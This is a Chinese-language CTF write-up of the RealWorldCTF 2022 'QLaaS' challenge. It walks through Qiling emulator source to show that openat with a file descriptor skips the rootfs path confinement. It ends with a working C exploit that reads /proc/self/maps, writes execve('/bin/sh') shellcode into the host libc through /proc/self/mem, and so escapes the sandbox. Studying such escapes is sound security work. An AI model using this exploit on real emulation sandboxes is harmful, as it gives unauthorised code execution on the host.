# RealWorldCTF2022-QLaaS


# QLaaS

这是我比较感兴趣的一个题目。在比赛时，我的思路是类似虚拟机逃逸，通过读写内存从而实现CPU的逃逸，为此我还去寻找了Unicorn的CVE。因为我很好奇，在程序访问内存时，沙盒是如何将地址进行处理从而保证安全的。我在cve中看到了在0x800000..00附近会有部分数据，而在真正的程序运行的时候不会使用这个地址。通过实验，我成功的读出了这部分的数据。但是我并不知道这部分是什么。

题目真正的攻击面在与`openat`函数没有正确处理目录穿越的问题。

下面我们先看看syscall_open:

```python
def ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int):
    path = ql.os.utils.read_cstring(filename)
    real_path = ql.os.path.transform_to_real_path(path)
    relative_path = ql.os.path.transform_to_relative_path(path)

    flags &= 0xffffffff
    mode &= 0xffffffff

    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)

    if idx == -1:
        regreturn = -EMFILE
    else:
        try:
            if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX:
                mode = 0

            #flags = ql_open_flag_mapping(ql, flags)
            flags = ql_open_flag_mapping(ql, flags)
            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode)
            regreturn = idx
        except QlSyscallError as e:
            regreturn = - e.errno


    ql.log.debug("open(%s, 0o%o) = %d" % (relative_path, mode, regreturn))

    if regreturn >= 0 and regreturn != 2:
        ql.log.debug(f'File found: {real_path:s}')
    else:
        ql.log.debug(f'File not found {real_path:s}')

    return regreturn
```

`open`将`path`分别转化为了`real_path`和`relative_path`。最终通过`ql.os.fs_mapper.open_ql_file`打开文件，不过使用的还是path。

```python
def open_ql_file(self, path, openflags, openmode, dir_fd=None):
    if self.has_mapping(path):
        self.ql.log.info(f"mapping {path}")
        return self._open_mapping_ql_file(path, openflags, openmode)
    else:
        if dir_fd:
            return ql_file.open(path, openflags, openmode, dir_fd=dir_fd)

        real_path = self.ql.os.path.transform_to_real_path(path)
        return ql_file.open(real_path, openflags, openmode)
```

如果文件已被映射则打开。如果没有，先检查dir_fd是否被指定，否则会使用` real_path`打开文件。

```python
    def transform_to_real_path(self, path):
        from types import FunctionType

        rootfs = self.ql.rootfs
        real_path = self.convert_path(rootfs, self.cwd, path)
        
        if os.path.islink(real_path):
            link_path = Path(os.readlink(real_path))
            if not link_path.is_absolute():
                real_path = Path(os.path.join(os.path.dirname(real_path), link_path))

            # resolve multilevel symbolic link
            if not os.path.exists(real_path):
                path_dirs = link_path.parts
                if link_path.is_absolute():
                    path_dirs = path_dirs[1:]

                for i in range(0, len(path_dirs)-1):
                    path_prefix = os.path.sep.join(path_dirs[:i+1])
                    real_path_prefix = self.transform_to_real_path(path_prefix)
                    path_remain = os.path.sep.join(path_dirs[i+1:])
                    real_path = Path(os.path.join(real_path_prefix, path_remain))
                    if os.path.exists(real_path):
                        break
            
        return str(real_path.absolute())
```

path被`convert_path`转换，最后返回真实路径的绝对路径。

```python
    @staticmethod
    def convert_for_native_os(rootfs, cwd, path):
        rootfs = Path(rootfs)
        cwd = PurePosixPath(cwd[1:])
        path = Path(path)
        if path.is_absolute():
            return rootfs / QlPathManager.normalize(path)
        else:
            return rootfs / QlPathManager.normalize(cwd / path.as_posix())

    def convert_path(self, rootfs, cwd, path):
        if  (self.ql.ostype == self.ql.platform ) \
            or (self.ql.ostype in [QL_OS.LINUX, QL_OS.MACOS] and self.ql.platform in [QL_OS.LINUX, QL_OS.MACOS]):
            return QlPathManager.convert_for_native_os(rootfs, cwd, path)
        elif self.ql.ostype in [QL_OS.LINUX, QL_OS.MACOS] and self.ql.platform == QL_OS.WINDOWS:
            return QlPathManager.convert_posix_to_win32(rootfs, cwd, path)
        elif self.ql.ostype == QL_OS.WINDOWS and self.ql.platform in [QL_OS.LINUX, QL_OS.MACOS]:
            return QlPathManager.convert_win32_to_posix(rootfs, cwd, path)
        else:
            # Fallback
            return QlPathManager.convert_for_native_os(rootfs, cwd, path)
```

最后无论如何我们的访问都被限制在了rootfs下。这里可以注意到，如果我们指定了dir_fd这不会对路径进行修正。限免看看`openat`实现：

```python
def ql_syscall_openat(ql: Qiling, fd: int, path: int, flags: int, mode: int):
    file_path = ql.os.utils.read_cstring(path)
    # real_path = ql.os.path.transform_to_real_path(path)
    # relative_path = ql.os.path.transform_to_relative_path(path)

    flags &= 0xffffffff
    mode &= 0xffffffff

    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)

    if idx == -1:
        regreturn = -EMFILE
    else:
        try:
            if ql.archtype== QL_ARCH.ARM:
                mode = 0

            flags = ql_open_flag_mapping(ql, flags)
            fd = ql.unpacks(ql.pack(fd))

            if 0 <= fd < NR_OPEN:
                dir_fd = ql.os.fd[fd].fileno()
            else:
                dir_fd = None

            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(file_path, flags, mode, dir_fd)

            regreturn = idx
        except QlSyscallError as e:
            regreturn = -e.errno
            
    ql.log.debug(f'openat(fd = {fd:d}, path = {file_path}, mode = {mode:#o}) = {regreturn:d}')

    return regreturn
```

这里指定了dir_fd。同时openat的man page

```bash
   openat()
       The openat() system call operates in exactly the same way as open(), except for the differences described here.

       If  the pathname given in pathname is relative, then it is interpreted relative to the directory referred to by the file descriptor dirfd (rather than rela‐
       tive to the current working directory of the calling process, as is done by open() for a relative pathname).

       If pathname is relative and dirfd is the special value AT_FDCWD, then pathname is interpreted relative to the  current  working  directory  of  the  calling
       process (like open()).

       If pathname is absolute, then dirfd is ignored.
```

如果路径是绝对路径，则dir_fd会被忽略。所以我们可以通过指定dir_fd为stdout来打开任意的文件。

## exploit

分行读取maps得到python的libc可执行段的地址，然后读取mem，通过`lseek`移到对应的便宜，然后写入shellcode即可。

```c
#include <fcntl.h>
#include <malloc.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "H\xbf/bin/sh\x00WH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05";

int main(int argc, char *argv[]) {
  int maps, mem;
  FILE *fp;

  maps = openat(1, "/proc/self/maps", O_RDONLY);
  if (maps < 0) {
    printf("Couldn't open /proc/self/maps'");
    exit(-1);
  }
  mem = openat(1, "/proc/self/mem", O_RDWR);
  if (maps < 0) {
    printf("Couldn't open /proc/self/mem'");
    exit(-1);
  }
  fp = fdopen(maps, "rw");
  if (fp == NULL) {
    printf("Couldn't open /proc/self/mem fd'");
    exit(-1);
  }

  char line[1024];
  unsigned long addr = 0;
  while (fgets(line, sizeof(line), fp)) {
    if (strstr(line, "r-xp") && strstr(line, "libc-2.31.so")) {
      sscanf(line, "%lx-", &addr);
      break;
    }
  }

  for (int i = 0; i < 0x17; i++) {
    lseek(mem, addr + i * 0x100, SEEK_SET);
    write(mem, shellcode, sizeof(shellcode));
  }

  return 0;
}
```




